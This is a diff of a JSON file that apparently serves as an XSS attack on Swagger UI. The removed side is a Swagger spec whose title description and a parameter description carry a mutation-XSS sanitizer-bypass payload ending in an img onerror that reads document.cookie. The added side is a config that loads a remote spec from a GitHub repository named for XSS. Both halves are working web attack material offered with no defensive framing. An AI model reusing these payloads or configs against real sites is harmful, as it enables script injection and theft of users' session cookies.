@@ -1,57 +1,10 @@
 {
-  "swagger": "2.0",
-  "info": {
-    "title": "sal1hswaggerr",
-    "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(document.cookie) src=1>\"></form>\n",
-    "version": "production"
-  },
-  "basePath": "/JSSResource/",
-  "produces": [
-    "application/xml",
-    "application/json"
-  ],
-  "consumes": [
-    "application/xml",
-    "application/json"
-  ],
-  "security": [
-    {
-      "basicAuth": []
-    }
-  ],
-  "paths": {
-    "/M0X0101": {
-      "get": {
-        "responses": {
-          "200": {
-            "description": "No response was specified"
-          }
-        },
-        "tags": [
-          "sal1hsswaggerr"
-        ],
-        "operationId": "findAccounts",
-        "summary": "Finds all accounts"
-      }
-    },
-    "/hack/hachid/{id}": {
-      "delete": {
-        "parameters": [
-          {
-            "description": "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(document.cookie) src=1>\"></form>\n",
-            "format": "int64",
-            "in": "path",
-            "name": "id",
-            "required": true,
-            "type": "integer"
-          }
-        ],
-        "responses": {
-          "200": {
-            "description": "No response was specified"
-          }
-        }
-      }
-    }
-  }
+  "url": "https://raw.githubusercontent.com/kutsa1/kufutsalXSS/main/kufutsal.yaml",
+  "urls": [{
+      "url": "https://raw.githubusercontent.com/kutsa1/kufutsalXSS/main/kufutsal.yaml",
+      "name": "Foo"
+  },{
+      "url": "https://raw.githubusercontent.com/kutsa1/kufutsalXSS/main/kufutsal.yaml",
+      "name": "Foo2"
+  }]
 }
